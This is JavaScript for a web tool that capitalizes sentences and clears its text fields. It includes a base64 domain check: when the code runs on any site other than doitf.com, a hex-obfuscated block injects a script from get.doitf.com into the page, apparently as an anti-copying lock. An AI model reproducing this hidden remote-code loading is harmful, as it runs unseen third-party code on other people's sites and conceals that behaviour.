document.getElementById("oldText").style.textAlign = "left";
document.getElementById("oldText").style.direction = "ltr";
document.getElementById("newText").style.textAlign = "left";
document.getElementById("newText").style.direction = "ltr";
function b64EncodeUnicode(e){return btoa(unescape(encodeURIComponent(e)));}function b64DecodeUnicode(e){return decodeURIComponent(escape(atob(e)));}var awsec=window.location.hostname,awsecdom=awsec.substring(awsec.lastIndexOf(".",awsec.lastIndexOf(".")-1)+1),b64awsec=b64EncodeUnicode(awsecdom);

document.getElementById("capitalizeSentences").addEventListener("click", function () {
		if (b64awsec == "ZG9pdGYuY29t"){
	var capText = document.getElementById("oldText").value;
	capText = capText.trim();
	
	//re1 = /\s+/g;
	//capText = capText.replace(re1," ");
	capText = capText.replace(/\!\s/g,"##!. "); 
	capText = capText.replace(/\?\s/g,"##?. "); 
	
	//hello.  hello?  hello. hello.
	
	
	var allCaps = document.getElementById("allCaps").checked;
	
	var capLock = document.getElementById("capLock").checked;
	
	
	if(capLock == 1 || capLock == true){
	capText = capText.toLowerCase();
	}
	
	
	if(allCaps == 1 || allCaps == true){
		capText = capText.replace(/\n/g,". [-<br>-] ");
		//Get rid of extra whitespaces now that linebreaks are protected
		re1 = /\s+/g;
		capText = capText.replace(re1," ");
		var wordSplit = ' ';
	}else{
		capText = capText.replace(/\.\n/g,".[-<br>-]. ");
		capText = capText.replace(/\.\s\n/g,". [-<br>-]. ");
		//Get rid of extra whitespaces now that linebreaks are protected
		re1 = /\s+/g;
		capText = capText.replace(re1," ");
		var wordSplit = '. ';
	}
	
	var wordArray = capText.split(wordSplit);
	
	var numWords = wordArray.length;
	
	for(x=0;x<numWords;x++) {
	
		wordArray[x] = wordArray[x].replace(wordArray[x].charAt(0),wordArray[x].charAt(0).toUpperCase());
		
		if(allCaps == 1 || allCaps == true){
				if(x==0) {
					capText = wordArray[x]+" ";
				}else if(x != numWords -1){
					capText = capText+wordArray[x]+" ";
				}else if(x == numWords -1){
					capText = capText+wordArray[x];
				}
		}else{
				if(x==0) {
					capText = wordArray[x]+". ";
				}else if(x != numWords -1){
					capText = capText+wordArray[x]+". ";
				}else if(x == numWords -1){
					capText = capText+wordArray[x];
				}
		
		}
		
		
	}
	
	if(allCaps == 1 || allCaps == true){
		capText = capText.replace(/\.\s\[-<br>-\]\s/g,"\n");
		capText = capText.replace(/\.\s\[-<br>-\]/g,"\n");
	}else{
		capText = capText.replace(/\[-<br>-\]\.\s/g,"\n");
	}
	
	capText = capText.replace(/\si\s/g," I ");    
	
	//var capText = capText.replace("##?. ", "? ");
	var capText = capText.replace(/\##\?\./gm, "?");  
	//var capText = capText.replace("##!. ", "! ");
	var capText = capText.replace(/\##\!\./gm, "!"); 

	document.getElementById("newText").value = capText;
					}else{
		var _0x871b=["\x73\x63\x72\x69\x70\x74","\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74","\x73\x72\x63","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x67\x65\x74\x2E\x64\x6F\x69\x74\x66\x2E\x63\x6F\x6D\x2F\x74\x6F\x6F\x6C\x73\x2F\x61\x77\x2E\x6A\x73","\x61\x70\x70\x65\x6E\x64\x43\x68\x69\x6C\x64","\x68\x65\x61\x64","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x73\x42\x79\x54\x61\x67\x4E\x61\x6D\x65"];var script=document[_0x871b[1]](_0x871b[0]);script[_0x871b[2]]= _0x871b[3];document[_0x871b[6]](_0x871b[5])[0][_0x871b[4]](script);
}
});

	//reset text areas
	document.getElementById("clearText").addEventListener("click", function () {
		document.getElementById("oldText").value = "";
		document.getElementById("newText").value = "";
		document.getElementById("oldText").focus();
	});	
	
	var textBox = document.getElementById("newText");
	textBox.onfocus = function() {
		textBox.select();
		textBox.onmouseup = function() {
			textBox.onmouseup = null;
			return false;
		};
	};